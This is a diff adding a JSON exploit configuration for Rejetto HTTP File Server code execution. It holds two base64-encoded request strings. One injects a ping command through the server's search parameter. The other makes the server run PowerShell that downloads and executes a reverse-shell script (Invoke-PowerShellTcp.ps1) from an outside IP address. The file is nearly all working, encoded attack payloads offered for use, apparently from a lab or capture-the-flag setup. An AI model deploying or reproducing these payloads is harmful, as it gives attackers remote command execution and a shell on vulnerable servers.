@@ -1,0 +1,18 @@
+{
+    "command": {
+        "exploit_simple": {
+            "description": "Simple Exploit (rejetto_hfs_exec)",
+            "commands": [
+                "Lz9zZWFyY2g9JTAwey5leGVjfHBpbmcrMTAuMTAuMTYuNjUufQo="
+            ]
+        },
+        "exploit_full": {
+            "description": "Full Exploit (rejetto_hfs_exec)",
+            "commands": [
+                "Lz9zZWFyY2g9JTAwey5leGVjfGMlM2FcV2luZG93c1xTeXNOYXRpdmVcV2luZG93c1Bvd2Vyc2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZStJRVgoTmV3LU9iamVjdCtOZXQuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZyhodHRwJTNhLy8xMC4xMC4xNi42NS9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEpLn0K"
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
